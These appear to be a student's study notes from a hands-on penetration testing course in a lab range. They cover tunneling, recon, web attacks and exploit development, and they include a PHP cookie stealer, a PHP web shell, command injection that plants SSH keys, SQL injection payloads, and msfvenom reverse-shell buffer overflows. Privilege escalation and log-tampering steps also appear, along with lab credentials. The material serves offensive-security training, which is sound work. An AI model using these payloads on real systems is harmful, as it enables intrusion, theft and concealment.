# Opstation details
  ## NIX_OPS
  10.50.171.189
  
  ## WIN_OPS
  10.50.171.194

  ## CTFD_SERVER
  ### 10.50.171.186:8000
  ---------------------------------
  ### Jump: 10.50.15.96
  ### USER: VERA-016-M
  ### PW: PVQiqIOpn7K4
  ### STACK#: 14

  ## For demonstrations
  1. ssh demo1@10.50.12.237 -L 1111:10.208.50.61:80 
  2. 127.0.0.1:1111/classinfo.html













  
# Day 1: Pen Testing | Exploitation Research | Recon & Scanning

## Pen Testing
  ### Phase 1: Mission
        -Scope of Mission
        -Determine valid targets (networks/machines)
        -Define RoE
  ### Phase 2: Recon
        -Public info gathering
        -DO NOT TOUCH THE TARGET
  ### Phase 3: Footprinting
        -Scan network/targets
  ### Phase 4: Exploitation/Initial Access
        -Gain it
  ### Phase 5: Post-exploitation
      -Persistence
      -Escalate priveleges
      -Obfuscate
      -Cover tracks
      -Exfiltrate target data
  ### Phase 6: Document/Report Mission

  

  ## Network Recon & Scanning
  
  ### Create Control Socket
  ssh -MS /tmp/jump student@10.50.15.96
   #### -M puts SSH into Master mode & multiplexing
   
   #### -S creates socket in specified directory
   #### Authenticate to jumpbox

  ### Ping Sweep 
  for i in {x..y}; do (ping -c 1 x.x.x.$i | grep "bytes from" &); done


  ### Set up Dyanmic port forward
  ssh -S /tmp/jump jump -O forward -D 9050

  ### Scan targets found 
  proxychains nmap <ip>

  ### Banner Grab open ports, Verify port services
  proxychains nc <ip> <port>
  !Press enter key just in case to get more info

  ### Set up local port forward to open port
  ssh -S /tmp/jump jump -O forward -L 1111:<tgt_ip>:<tgt_port> -L 1112:<tgt_ip>:<tgt_port>

  ### Use Firefox
  127.0.0.1:<localportforward>

#################################################################################################### 

  ### Create New Master Socket To New IP
  ssh -MS /tmp/t1 username@127.0.0.1 -p <localportyousetup>

  ### Thorugh recon found IP ex: 10.200.30.50, run a ping on jump box
  Ping from t1 box: ping <10.200.30.50> ## it is up

  ### Cancel dynamic port forward
  ssh -S /tmp/jump jump -O cancel -D 9050

  ### Set up port forwards on new master socket
  ssh -S /tmp/t1 t1 -O forward -D 9050

  ### Scan found target IP
  proxychains nmap <target ip> |
  verify open ports & services 

  ### Port forward to newly found ports 
  ssh -S /tmp/t1 t1 -O forward -L 2111:<tgtip>:<tgt port> -L 2112:<tgtip>:<tgtport>



## WEB SCRAPER- only change http & authors
  #!/usr/bin/env python
  

  import lxml.html
  import requests


  def main():


  page = requests.get('http://quotes.toscrape.com')
  tree = lxml.html.fromstring(page.content)


  authors = tree.xpath('//small[@class="author"]/text()')


  print ('Authors: ',authors)































# DAY 2: WEBEX D1

## Web Fundamentals

### HTTP 
  -HTTP methods: OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, CONNECT
  -HTTP fields: Host, User-Agent, Referer, Accept-Language, Accept, Cookie, Content-Length
  
-----------------------------------
### JavaScript
  -Useful JavaScript components: Capturing Cookies | Capturing Keystrokes & Sensitive Data
  #### Demo: 
   ##### Getting Demo IP using methodology:
    -1. Demo IP: 10.50.13.128
    -2. Create Intial tunnel: ssh -MS /tmp/demo demo@10.50.13.128
    -Use scanning methods
    -3. Website IP found: 10.208.50.42
    -4. Create Dynamic tunnel for nmap: ssh -S /tmp/demo demo -O forward -D9050
    -5. Run nmap: proxychains nmao 10.208.50.42
    -6.Run nmap: proxychains nmap -sV --script=http-enum -p 80 10.208.50.42
    -7. Create local forward to Web server: ssh -S /tmp/demo demo -O forward -L12344:10.208.50.42:80
    -8. Access local port through firefox
  ##### What did we learn:
    - Find suspicious Java script function
    - Run functions in console that you find inspect code

--------------------------------------- 
### Cross-Site Scripting (XSS)
  -Types: Reflected vs. Stored
#### Stored XSS
  -Resides on vulnerable site
  ##### Command Injection | ADD SEMICOLON ; and then command
      -Run commands into areas of entry that arent meant for those commands.
      -Cmds:; cat /etc/shadow, whoami, uname -a
  
  ##### Directory Traversal
      -Find where an equal sign resides and add
      -Write ../../../../../etc/passwd
  
  #### Malicious File Upload
  ##### 1
      -<?php
      -$cookie = $_GET["username"];
      -$steal = fopen("/var/www/html/cookiefile.txt", "a+");
      -fwrite($steal, $cookie ."\n");
      -fclose($steal);i
      -?>
  #### 2
  
      -<HTML><BODY>
      -<FORM METHOD="GET" NAME="myform" ACTION="">
      -<INPUT TYPE="text" NAME="cmd">
      -<INPUT TYPE="submit" VALUE="Send">
      -</FORM>
      -<pre>
      -<?php
      -if($_GET['cmd']) {
      -system($_GET['cmd']);
      -}
      -?>
      -</pre>
      -</BODY></HTML>
      -1. Make sure the file gets uploaded
      

### SSH KEYGEN/UPLOAD - works with command injection to view home directory of current user - home dir here is /var/user
      -1. Make a directory to put my own key inside: ;mkdir /var/user/.ssh
      -2. See if the dir was made: ls /var/user
      -3. Run on own: ssh-keygen -t rsa -b 4096; hit enter 3 times after running it
      -4. Run on own: cat /home/student/.ssh/id_rsa.pub - COPY EVERYTHING THAT IS OUTPUTTED top to bottom
      -5. Run on web: ;echo "<output of number 4>" > /var/user/.ssh/authorized_keys
      -6. Verify key was made: ;ls -lisa /var/user/.ssh
      -7. Modify already made tunnel to hit the port 22 at end of -L
      -8. Run on own to query tunnel: ssh -i .ssh/id_rsa.pub user@127.0.0.1 -p RHP

















# DAY 3: WEBEX D2

## SQL (Injections) - AKA Structured Query Language
  - Create SQL queries
  - Perform SQL Injections through GET & POST http commands
  - INPUTTING is POST, SELECTING IS GET
### Standard SQL Commands
  - SELECT
  - UNION
  - Add single quote ' to find input fields

### SQL Credential/Authentication Bypass Dumping
     - 1. Local forward to SQL Server: ssh demo1@10.50.12.237 -L 1235:10.208.50.61:80
     - 2. Visit SQL page
     - 3. INPUT ( tom' OR 1='1 ) into user & pw fields -DONT LOGIN YET
     - 4. INSPECT. View network tab and NOW Login with creds while viewing network tab
     - 5. GET and POST should pop up: Click POST request, right hand side click request - check what we inputted
     - 6. Turn on Raw to turn POST into ONE line ( Called Request payload (should be one line)
     - 7. Copy string, add ? to URL to intialize variable and PASTE string into URL and press ENTER
      -8. Whatever the output, View Page Source

### SQL Inject Golden Rule Demo
     - 1. Golden Statement
       - table_schema,table_name,column_name from information_schema.columns
     - <NAME OF COLUMN>,<NAME OF COLUMN>,<NAME OF COLUMN> from <NAME OF DATABASE>,<NAME OF TABLE>

     - 2. Access SQL DBL
       -run: mysql
       
     - 3. Show databases - THREE DEFAULT DATABASES (information_schema, mysql, perfofrmance_schema)
       -run: show databases ;

     - 4. Run golden statement
       -run: select table_schema,table_name,column_name from information_schema.columns ;

     - 5. Manuever into infoschema DB
       -run: use information_schema  ;

     - 6. Output tables
       -run: show tables ;

     - 7. Output columns 
       -run: show columns from columns ;
       -Should now output table_schema, table_name, column_name

  #### SQL INJECTION POST METHOD on website

     -1. Identify vulnerable field/selection
       -Use truth statement ( tom' OR 1='1 ) while replacing "tom" with the Selections given
       -Basically seeing what still works WHILE using selection names, what does not have input sanitization

     -2. Identify # of columns, utilize UNION SELECT
       - vulnerableselectionname' UNION SELECT 1,2,3,4 #
       - If didnt work, add another number
       - vulnerableselectionname' UNION SELECT 1,2,3,4,5 #

     -3. Edit Golden Statement- ONLY CHANGE: 2 = column we cant see, 5 = total amount of columns you can query ( IMPORTANT )
       - INPUT: vulnerableselectionname' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
       - MAKE SURE TO REPLACE THE ( 1,2,3,4,5 # ) in last command with GOLDEN STATEMENT
       - Should OUTPUT ENTIRE DATABASE
       - KEEP TRACK OF TABLE FOR CRAFTING QUERIES
       -Database            Table               Column

      -4. Craft our queries |  2 = column we cant see, only change name of cyouWANT and database.Table
       -vulnerableselectionname' UNION SELECT nameofcyouWANT,2,nameofc,nameofc,nameofc from database.Table
       -PUT @@version into a field to see version


   #### SQL INJECTION GET METHOD on website

     -1. Idenitfy vulnerable field/selection
       -Interact with GET REQUEST, test all selectionnames, and view the URL
       -Add ( or 1 = 1 ) after the variable '?' or whatever shows signs of change.
       -Change Url or selectionname and repeat until you get data back

    -2. Identify # of columns/selections, utilizing UNION SELECT
      - Change URL- delete ( or 1=1 ) and replace with UNION SELECT # of columns presented
        -ex: 127.0.0.1:1235/uniondemo.php?Selection=2 or 1=1 -> 127.0.0.1:1235/uniondemom.php?Selection=2 UNION SELECT 1,2,3 | can do UNION SELECT 1,2,@@version to view version
        -If did not present all possible columns, keep adding a new number
        -CHECK TO SEE IF COLUMNS ARE IN ORDER1`

    -3. Edit Golden Statement- ONLY CHANGE: 2 = column we cant see, 5 = total amount of columns you can query ( IMPORTANT )
      -INPUT I=CHANGE INTO URL:127.0.0.1:1235/uniondemom.php?Selection=2 UNION SELECT 1,2,3 ->  UNION SELECT table_schema,table_name,column_name from information_schema.columns
      -Change golden statment SELECTIONS if when identifying columns, you notice they are outputted in a different way ex, 1,3,2. ex. table_schema,table_name,column_name -> table_schema,column_name,table_name

    -4. Craft our queries |  2 = column we cant see, only change name of cyouWANT and database.Table
       -Put into URL 
       -vulnerableselectionname' UNION SELECT nameofcyouWANT,nameofc,nameofc,nameofc from database.Table


















# Day 4: Reverse Engineering
  ## X86_64 Assembly
   ### 16 general purpose 64-Bit Registers
     -EXAMPLE:
       -%rax: first return register
       -%rbp: the base pointer that keeps track of base of stack
       -%rsp: the stack pointer that points to top of stack  
       -EX: [%ebp=0x8]
       
  ### Common Terms
    - HEAP
    - STACK
    - GENERAL REGISTER
    - CONTROL REGISTER
    - FLAGS REGISTER

  ### Common INSTRUCTION POINTERS
    - MOV  : move source to dest
    - PUSH : push source onto stack
    - POP  : pop top of stack to dest
    - INC  : increment by 1
    - DEC  : decrement by 1
    - ADD  : add source to dest
    - SUB  : subtract source from dest
    - CMP  : Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
    - JMP  : Jump to specified location
    - JLE  : Jump if less than or eq
    - JE   : Jump if eq


  ### EXAMPLE ASSEMBLY PROBLEM

    - main:
        mov rax,16     # 16 moved into rax(16)
        push rax       # push value rax(16) onto stack
        jmp mem2       # jmp to mem2 memory location

    - mem1:
        mov rax, 0    # 0 (exit code) moved into rax
        ret           # exit code 

    - mem2:
        pop r8        # pop r8(16) on the stack
        cmp rax, r8   # rax(16) r8(16)
        je mem1       # jump to mem1 if above equal


  ## Reverse Engineer Workflow
    - 1. Static
    - 2. Behavioral
    - 3. Dynamic
    - 4. Disassembly
    - 5. Document Findings



















# Day 5: Exploit Development - Linux

## Buffer Overflow
  ### Common Terms
      -HEAP
      -STACK
      -REGISTERS
      -INSTRUCTION POINTER (IP)
      -STACK POINTER (SP)
      -BASE POINTER (BP)
      -FUNCTION
      -SHELLCODE

  ### Defenses
      -NON exectuable stack
      -Address SPace Layout Randomization
      -Data Execution Prevention (DEP)
      -Stack Canaries
      -Position Independent Executable

  ### Demo
    -1. Run: file <file> to see what kind of exectuable
    -2. Run: strings <file> - parse through 
    -3. Run: chmod u+x <file>
    -4. Run the file  
        -Command substituton: ./<file> $(echo: "<input>") or add <<<
        -Fuzz the program, add a bunch of characters

      
    -5. Launch GDB- Run: gdb ./<file>
        -Run shell for shell ; exit for back into gdb

    -6. Run program: run

    -7. Ctrl + C, Run: info functions to spit out all functions

    -8. Run: pdisass main | to disassemble main
      -Focus/Take note: get user input

    -9. Run: pdisass getuserinput | dissassemble getuserinput

    -10. Run: vim <name>.py | script to test BFO
            -#!/usr/bin/env python
            -
            -offset = "A" * 100

            -print(offset)
            
            -wq!

    -11. IN GDP:  run <<<$(python ./<name>.py)
      -Verify the program broke with the EIP:0x4141

    -12. Go to wiremask.eu & get 100 character string; replace offset with new string
      -Run again

    -13. Plug EIP value into 'find the offset' in wiremask

    -14. Once offset found- 
          -a. Go back into code and replace offset: offset = "A" * new number
          -b. add line of code: eip = "BBBB"
          -c. add: print(offset+eip)
          -d. run again; make sure EIP = BBBB in output

    -15. run: shell
          -a. in regular shell run: env - gdb ./<name> (** ON TARGET **)
          -b. run: unset env LINES  (** ON TARGET **)
          -c. run: unset env COLUMNS (** ON TARGET **)
          -d. run: run (** ON TARGET **)
          -e. Ctrl + C to interrupt (** ON TARGET **)
          -f. run: info proc map(** ON TARGET **)
          -g. Copy hex memory add of: line directly after heap | line of [stack]
          -h. run: find /b [line after heap],[line of stack], 0xff, 0xe4
          -i. Copy first 4 addresses, paste into py script as comments
          -j. Reverse the firstaddresses from big to little endian
            -I. ex: 0xf7 de 3b 59 -> \x59\x3b\xde\xf7
          -k. Replace eip variable with little endian
          -l. Add line in script under eip: nop = "\x90" * 15
          -m. Add + nop to print statement

     -16. Open new terminal
         -a. run: msfvenom -p linux/x86/exec CMD=<cmd> -b '\0x00' -f python
         -b. Copy everything with buf = 
         -c. paste into script under nop
         -d. add + buf to print statement
         
      -17. RUN sudo -l to see on remote machines what are priveleges
          PUT stuff into /tmp for remote machines
        `Run: run <<<$(python ./<name>.py)
          
          


      











# Day 6: Exploit Development - Windows

## Demo
  -1. cd C:\Users\student\downloads or wherever the downloaded files are
  -2. Start static analysis
    a. strings.exe -a -nobanner .\nameof.exe | select -first 10 
      OR
    b.strings.exe -a -n 7 -nobanner .\nameof.exe 

  -3. Start Behavioral Analysis
    a. Open Immunity as ADMIN > Run nameof.exe as ADMIN > File > Attach - NOTE PID DOWN > attach nameof.exe | Make sure exe is running. refresh attach while exe running to see it.
      i. take note of the pid
    b. Run: get-process | findstr /i (part of name.exe) match the PIDS
    c. Run: netstat -anop tcp | findstr <PID>; see if something is listening
    d. If PAUSE in bottom right, click play button to play in top left; should change to 'Running'
    
  -4. Create Script on linux machine 
      -a. View peep.py in /home/student/pee

  -5. Send/Run script while program is running AND immunity is running in bottom right on windows machine. EVERY TIME RUN SCRIPT -> RESTART/REWIND IMMUNITY AND EXE

  -6. Slowly increase buf to see if overflow worked (overflow 4141 in EIP)

  -7. Go to wiremask.com, input the number that you multiplied by A to get the overflow 4141 in EIP section in immunity, and paste it into replace the "A"

  -8. Reset immunity and run script again with new BUF, copy new EIP value and input into 'Find the offset' in wiremask. Take that value and input revert back into the buf += 'A' * <number of offset>

  -9. Add the buf += "BBBB" under the buf += "A", Look in immunity to see EIP = 4242 to verify worked

  -10. Utulize Mone modules to search for unprotected DLLs
    a. run  in bottom white of Immunity: !mona modules  
    b. Look for dll with Falses across the board, meaning dll is uprotected
    c. run in bottom: !mona jmp -r esp -m "<dll>"
    d. Window > Log Data > View results
    e. On first line: Right click > copy to clipboard > address | convert it into little endian format
      i. example : 0x625011af -> "\xAF\x11\x50\x62"
    f. Replace 4 B's buf statement in script with new little endian value
    g. From LinOPS, generate shell code using msfvenom
      i. msfvenom -p windows/shell/reverse_tcp lhost=10.50.171.194 lport=4444 -b "\xOO" -f python
    h. Paste output under all bufs already placed.
    i. Add nop line: "\x90" * 15

  -11. Create msfconsole multi/handler from linops
    a.msfconsole
    b.use multi/handler
    c.set payload windows/meterpreter/reverse_tcp
    d.set LHOST 0.0.0.0
    e.set LPORT 4444
    f.exploit



































# Day 7: Post exploitation
   ## SSH
     -ssh local port -L | remote port -R
     -windows ssh: netsh
     -SSH Keys
       a. share public key to intiate connection
       b. NEVER share public stuff

  ## Local Host Enumeration
    -net user
    -cat /etc/passwd

    -tasklist /v
    -ps -elf

    -tasklist /svc
    -chkconfig
    -systemctl --type=service

    -ipconfig /all
    -ifconfig -a
    -ip a

  ### Data Exfiltration
    -scp <source> <destination>
    -ncat -ssl <ip> <port>
























# Day 8: Windows Exploitation/Escalation

-Check UAC settings in registry: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
-Find v

 ## Task Scheduler 
    -Check for running tasks
    -Check Triggers and Action 
    -Command line: schtasks /query /fo LIST /v

  ## DLL Hijacking
   -1. Download exe
  ----not need for test
   -2. Run procmon
      -a. Filters:
        i.Process Name contatins <nameofexe>
        ii.Result is NAME NOT FOUND
        iii. Path contains .dll
      -b. Identify "SSPICLI.dll"
      
    -3. Make payload on LINOPScd : msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > ls
    C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll

    -4. Put file into new dir

    -5. Host python server on linops: python3 -m http.server <RHP> 
    
    -6. Visit http server in WinOps: In google type in LinOps ip : port

    -7. Download dll, place into same directory as previous dll

    -8. Run putty(process) 

  ## Persistence 
  
  ### Services
    -1. Run Services
    -2. Click Name & Description (LOOK FOR EMPTY DESCRIPTIONS AND SUS NAMES)

  ### Registry 
    -HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
    -HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    -HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
    -HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

 ## Cover Tracks
 
  ### Log & Events
  -Event Viewer Application
    a.  Event viewer > click logs > Create a custom filte> Look at details
  -Create Custom Views top right
  -Make sure you are looking at the right log

  ### Audit Logging
  -Run: auditpol /get /category:* | findst /i "success failure"
  - THIS COMMAND REQUIRES PERMISSIONS

 













# Day 9: Linux Exploitation/Escalation

  ## Privelege Escalation:

   ### Sudo- run: sudo -l to see current permissions on user

   1.-sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

   2. After runing sudo -l, If a file has asterix at the end of it permissions file  
        -a. sudo cat <filepath>* /etc/shadow

    
   ### SUID
    -find / -type f -perm /4000 -ls 2>/dev/null
       -visit gtfobins.github.io/gtfobins/*NAMEOFBINARY*

    -Follow steps on webpage- Example: ./*nameofbinary* /bin/sh -p

  ### SGUID 
    -find / -type f -perm /2000 -ls 2>/dev/null

  ### Dot "." in PATH


  ## Persistence
    -Crontab
    -Add /hijack user account

  ## Covering your tracks
    -unset HISTFILE
    -Figure out Init Type
      a. ls -latr /proc/1exe
      b.stat /sbin/init
      c.man init
      d.init --version
      e.ps 1

    -Logs for covering tracks in /var/log:
      a. auth.log/secure
      b.lastlog
      c.btmp
      d.sulog
      e.utmp
      f.wtmp
      g. Make sure you timestomp log: touch -c -t





# Test Notes

## Once in a box
 - Look at /etc/hosts whenever you can
 - For linux escalation: Look at sudo -l first, if doesnt work, go to suid or sguid bit exploit
1. Once made ssh connection from linops to first target
2. Enumerate: cat /etc/passwd for users , /etc/hosts for connections/dns , /etc/crontab for scheduled tasks, id, whoami, sudo -l
3. Make sure to use http-enum on port 80

## Priv Esc Lin
sudo -l #  if binary found with sudo -l, use sudo option in gtfo bins
        #  if binary found with find command, use SUID option in gtfo bins
SUID- Use find / -type (2000, 4000, 6000) to view available commands to run with our without sudo for higher permissions.
      -Run which command to see if commands are installed.
      -THERE WILL BE AN OBVIOUS BINARY TO USE IN SUID binaries, look at top and bottom 5

  ## GDB
      - If running on the remote machine, run regular disass without the 'p' or scp file over to use gdb peda like in the notes.
       -disass main
       
## Directory Traversal/Command Injection
 - If given option to input/search for things and output such like cat command: try to use   - ;<command>  - to test
 - If does not work, try to /../../../../../../../etc/passwd & /etc/hosts

## Malicious Upload 
  - 3 conditions to meet in order to use:
      1. Be able to upload
      2. Be able to get to the upload
      3. Has to be able run

## SQL
  ### Authentication Bypass
    - 1. Local forward to SQL Server: ssh demo1@10.50.12.237 -L 1235:10.208.50.61:80
     - 2. Visit SQL page
     - 3. INPUT ( tom' OR 1='1 ) into user & pw fields -DONT LOGIN YET
     - 4. INSPECT. View network tab and NOW Login with creds while viewing network tab
     - 5. GET and POST should pop up: Click POST request, right hand side click request - check what we inputted
     - 6. Turn on Raw to turn POST into ONE line ( Called Request payload (should be one line)
     - 7. Copy string, add ? to URL to intialize variable and PASTE string into URL and press ENTER
      -8. Whatever the output, View Page Source

  ## Golden Statement, POST(User Input BOX) & GET(URL) method
  1. Identify vuln field -
  2. Identify number of columns with vuln field: UNION SELECT 1,2,3( can add more for fuzzing ), NOTIFY IF COLUMNS ARE SWITCHED 
  3. U

  ## Windows Priv esc | Visit TaskSched, Services ( No Descriptions:Click Description Filter), Registry Run Keys- look in notes, audit policies (auditpol)
  - Go to TaskSched and find executable

  - 

# NOTES- LOOK AT /ETC/SYSLOG
  Stack Number 14
  UN: VERA-016-M
  PW: P1zWMuYTWEkS
  jump: 10.50.16.10
